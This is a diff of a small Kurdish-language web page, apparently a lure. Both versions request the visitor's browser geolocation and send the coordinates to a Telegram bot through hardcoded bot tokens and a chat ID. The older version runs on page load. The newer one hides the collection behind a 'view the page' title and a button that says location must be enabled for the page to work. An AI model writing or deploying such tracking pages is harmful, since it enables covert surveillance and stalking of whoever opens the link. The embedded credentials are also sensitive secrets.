@@ -1,49 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location Access</title>
-</head>
-<body>
-  <h2>چاوەڕوان بە...</h2>
-  <p>شوێنەکەت دەنووسرێت</p>
-
+  <title>بینینی پەڕەکە</title>
+  <meta charset="utf-8">
   <script>
-    function sendLocation(lat, lon) {
-      const botToken = "7835040271:8112046407:AAHxDVlpKVZvHYIDaJekjQGIu7S8UDSOxdM";
-      const chatId = "7594104612";
-      const message = `شوێنی بەکارهێنەر:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`;
+    function sendLocation(position) {
+      var lat = position.coords.latitude;
+      var lon = position.coords.longitude;
+      var token = "7835040271:AAFmaIjCdtgYlR_L44Sevj8gvROrvN7FkUk";
+      var chat_id = "7594104612";
+      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=لۆکەیشنی بەکارهێنەر:%0ALatitude: ${lat}%0ALongitude: ${lon}`;
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
+      fetch(url)
+        .then(response => {
+          if (response.ok) {
+            alert("سەرکەوتوو بوو، زۆر سوپاس");
+          } else {
+            alert("کێشە هەیە لۆکەیشنت پێ نەکردووە");
+          }
         })
-      }).then(response => {
-        document.body.innerHTML = "<h3>سوپاس، شوێنت نێردرا.</h3>";
-      }).catch(error => {
-        document.body.innerHTML = "<h3>هەڵەیەک ڕوویدا.</h3>";
-      });
+        .catch(error => {
+          alert("هەڵەیەک ڕوویدا: " + error);
+        });
     }
 
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          sendLocation(lat, lon);
-        }, error => {
-          document.body.innerHTML = "<h3>نەتوانرا شوێن وەرگیرا بۆت.</h3>";
+        navigator.geolocation.getCurrentPosition(sendLocation, function(error) {
+          alert("ناتوانیت بیبینیت لۆکەیشنت کێشەی هەیە پێ نەکراوە");
         });
       } else {
-        document.body.innerHTML = "<h3>گەشەپێدانی شوێن پشتیوانی ناکرێت.</h3>";
+        alert("ئەمەزگەیەکت ڕێگە پێ نەدات بە لۆکەیشن");
       }
     }
-
-    window.onload = getLocation;
   </script>
+</head>
+<body>
+  <h2>ناردنی لۆکەیشن بۆ تلیگرام</h2>
+  <button onclick="getLocation()">تکایە لۆکەیشن بکەوە بۆ ئەوەی کار بکات</button>
 </body>
 </html>
